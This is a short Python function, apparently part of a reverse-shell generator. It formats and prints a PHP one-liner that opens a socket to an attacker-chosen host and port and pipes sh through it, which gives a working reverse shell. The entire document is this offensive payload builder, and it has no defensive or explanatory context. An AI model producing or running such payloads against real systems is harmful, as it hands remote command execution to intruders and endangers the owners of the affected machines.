def generate_php(lhost, lport):
    # generate the php command
    print('')
    print('---------------------------------------------------------------------------')
    php_command = f'php -r \'$sock=fsockopen("{lhost}",{lport});exec("sh <&3 >&3 2>&3");\''
    
    print('')
    print(php_command)
    print('')
    print('---------------------------------------------------------------------------')

